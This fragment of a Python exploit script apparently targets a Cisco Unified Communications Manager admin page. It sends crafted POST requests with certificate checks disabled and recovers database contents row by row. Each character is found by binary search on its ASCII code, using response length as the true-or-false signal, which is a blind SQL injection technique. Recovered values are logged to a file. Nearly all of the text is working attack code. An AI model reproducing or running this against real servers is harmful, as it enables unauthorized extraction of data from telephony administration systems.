				theRequest_data={"rowsPerPageControl": "/ccmadmin/userGroupFindList.do?lookup=true&multiple=true&whereClause=&rowsPerPage=50&pageNumber=1", "rowsVisible": "1", "primaryTable": "dirGroup", "dispCols": "pkid#name#minimumuserrank#isStandard", "searchField0": "name", "searchLimVal0": "beginsWith", "searchLimit0": "beginsWith", "searchString0": '', "searchField1": "name", "searchLimVal1": "beginsWith", "searchLimit1": "beginsWith", "searchString1": '', "searchField2": "name", "searchLimVal2": "beginsWith", "searchLimit2": "beginsWith", "searchString2": '', "searchField3": "name", "searchLimVal3": "beginsWith", "searchLimit3": "beginsWith", "searchString3": '', "searchField4": "name", "searchLimVal4": "beginsWith", "searchLimit4": "beginsWith", "searchString4": '', "searchField5": "name", "searchLimVal5": "beginsWith", "searchLimit5": "beginsWith", "searchString5": '', "searchField6": "name", "searchLimVal6": "beginsWith", "searchLimit6": "beginsWith", "searchString6": '', "searchField7": "name", "searchLimVal7": "beginsWith", "searchLimit7": "beginsWith", "searchString7": '', "searchField8": "name", "searchLimVal8": "beginsWith", "searchLimit8": "beginsWith", "searchString8": '', "searchField9": "name", "searchLimVal9": "beginsWith", "searchLimit9": "beginsWith", "searchString9": ''}
				response = requests.post(theRequest_url, headers=theRequest_headers, cookies=theRequest_cookies, data=theRequest_data, verify=False)
				responseLength = len(response.content)
				if responseLength > 60000:
					#ascii character found
					asciiCharacter = asciiCharacter + (64 / (2**int(asciiCounter)))
					asciiCharacter = int(asciiCharacter)
					asciiCounter = asciiCounter + 1
				elif "conversion process failed" in response or "It is not possible to convert between the specified types" in response:
					#if the conversion of the ascii from the table failed
					print("[*] query failed due to a conversion issue. skipping column")
					databaseName = "UNCONVERTABLE"
					asciiCharacter = 0
				else:
				#ascii character not found
					asciiCharacter = asciiCharacter - (64 / (2**int(asciiCounter)))
					asciiCharacter = int(asciiCharacter)
					asciiCounter = asciiCounter + 1
				if asciiCharacter == 0:
					if len(databaseName) < 1:
						asciiCharacter = 64
						asciiCounter = 1
						characterPosition = 1
						databaseName = ""
						#add to the columnCounter
						columnCounter = int(columnCounter) + 1
						#remove from the remaining columns
						numberOfColumns = int(numberOfColumns) - 1
					else:
						print('[*] end of entry: ' + str(databaseName))
						result = "row: " + str(rowCounter) + "| column: " + str(columnArray[columnCounter]) + "| value: " + str(databaseName) + "\n"
						writeToFile = open(path,'a')
						writeToFile.write(result)
						writeToFile.close()
						#column enumerated, move onto the next column
						#add to the columnCounter
						columnCounter = int(columnCounter) + 1
						#remove from the remaining columns
						numberOfColumns = int(numberOfColumns) - 1
						asciiCharacter = 64
						asciiCounter = 1
						characterPosition = 1
						databaseName = ""
		#if run out of columns then the row is complete
		print("================row complete: " + str(rowCounter))
		rowCounter = int(rowCounter) + 1
		numberOfColumns = len(columnArray)
		columnCounter = 0
		lasciiCharacter = 64
		asciiCounter = 1
		characterPosition = 1

nColsResult = database_nCols(cookie1, cookie2, cookie3, tableId)
nCols, cookie2 = nColsResult.split()

database_name(cookie1, cookie2, cookie3, tableId, nCols)
